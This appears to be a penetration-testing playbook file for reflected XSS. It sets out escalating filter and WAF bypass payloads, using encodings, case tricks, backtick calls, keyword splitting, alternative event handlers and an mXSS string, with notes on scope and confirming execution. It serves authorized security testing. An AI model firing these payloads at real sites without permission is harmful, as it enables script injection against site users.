# Filter / WAF bypass ladder for reflected XSS (step 6)
# Escalate only when the prior rung is blocked (mirror of the fetch ladder philosophy).
# Record every attempt in payloads_tried.jsonl: {payload, encoding, blocked, reflected, executed}.
# Stay in scope + rate-limited (roe-gate.md). The PoC must be the payload that ACTUALLY executed.

## Rung 0 — plain
`<svg onload=alert(1)>`

## Rung 1 — case / whitespace
```
<SvG OnLoAd=alert(1)>
<svg/onload=alert(1)>
<svg%09onload=alert(1)>      # tab
<svg%0aonload=alert(1)>      # newline
```

## Rung 2 — HTML entities / numeric refs (attribute & handler)
```
&#x6a;avascript:alert(1)           # javascript: in href
<img src=x onerror=&#97;lert(1)>
<svg onload=alert&#40;1&#41;>
```

## Rung 3 — URL / double / mixed encoding (reflected via query)
```
%3Csvg%20onload%3Dalert(1)%3E
%253Csvg...%253E                   # double-encode if one layer is stripped
```

## Rung 4 — no-parentheses / no-space / alt sinks (char or keyword filters)
```
<svg onload=alert`1`>              # backtick call
<img src=x onerror=alert`1`>
<svg><script>alert&#40;1&#41</script>
<svg onload=top[/al/.source+/ert/.source](1)>   # keyword split
```

## Rung 5 — tag/attr variety (blocklist gaps)
```
<body onresize=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<x contenteditable onbeforeinput=alert(1)>
```

## Rung 6 — unicode / mutation / exotic
```
<svg onload=alert(1)>
<noscript><p title="</noscript><svg onload=alert(1)>">   # mXSS
```

## Notes
- Identify WHICH character/keyword is filtered (break it down), then pick the lowest rung that bypasses it — don't jump to rung 6.
- A payload that is *reflected but encoded* is NOT a bypass. Confirm execution (verify.md).
- If a CSP blocks inline handlers, look for an allowed-source gadget or report as "reflected, non-executing under CSP" (low/info).
